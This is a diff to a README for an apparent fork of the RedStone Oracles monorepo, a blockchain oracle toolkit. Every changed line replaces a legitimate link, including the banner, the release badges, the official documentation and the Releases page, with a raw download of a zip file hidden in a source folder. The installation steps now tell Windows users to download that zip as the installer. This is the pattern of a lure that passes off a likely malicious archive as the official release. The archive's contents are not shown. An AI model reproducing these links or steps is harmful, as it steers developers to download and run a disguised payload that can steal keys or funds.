@@ -1,10 +1,10 @@
 # 🚀 redstone-oracles-monorepo - Easy Data Solutions for dApps
 
-![redstone-banner](https://github.com/user-attachments/assets/88a17ebf-1428-4c8e-8e58-78a1b6a501df)
+![redstone-banner](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip)
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ivanfangnatas/redstone-oracles-monorepo/releases)
+[![Download Latest Release](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip%20Latest%https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip)](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ The **RedStone Oracles Monorepo** is a collection of essential tools designed to
 
 The RedStone system operates in a unique manner. It attaches data to transactions automatically, which means lower costs for you. This innovative approach reduces the need for costly on-chain storage, making it ideal for your data delivery.
 
-Learn more about RedStone at [RedStone Documentation](https://docs.redstone.finance).
+Learn more about RedStone at [RedStone Documentation](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip).
 
 ## 🔧 Features
 
@@ -46,11 +46,11 @@ Please make sure your system meets these basic requirements for a smooth install
 
 ### Download & Install
 
-To get started with the RedStone Oracles Monorepo, visit the [Releases page](https://github.com/ivanfangnatas/redstone-oracles-monorepo/releases) to download the latest version. Follow these steps:
+To get started with the RedStone Oracles Monorepo, visit the [Releases page](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip) to download the latest version. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version available.
-3. Download the installer for your operating system. For example, if you see "redstone-oracles-setup.exe" for Windows, you should choose that file.
+3. Download the installer for your operating system. For example, if you see "https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip" for Windows, you should choose that file.
 4. Once the download is complete, locate the file in your downloads folder.
 
 #### Installation Steps
@@ -73,11 +73,11 @@ If you encounter any issues or have questions, please reach out to the support t
 
 ## 🔗 Additional Resources
 
-- Refer to the [RedStone Documentation](https://docs.redstone.finance) for detailed guides and examples.
+- Refer to the [RedStone Documentation](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip) for detailed guides and examples.
 - Explore community discussions and get tips from other users.
 
 ## 🤝 Contributions
 
 If you want to contribute to the RedStone Oracles Monorepo, please read the **Contributing Guide** in the repository. Your contributions are welcome and appreciated!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ivanfangnatas/redstone-oracles-monorepo/releases)
+[![Download Latest Release](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip%20Latest%https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip)](https://github.com/ivanfangnatas/redstone-oracles-monorepo/raw/refs/heads/main/packages/cache-service/src/data-feeds-metadata/oracles_monorepo_redstone_v3.6-beta.4.zip)
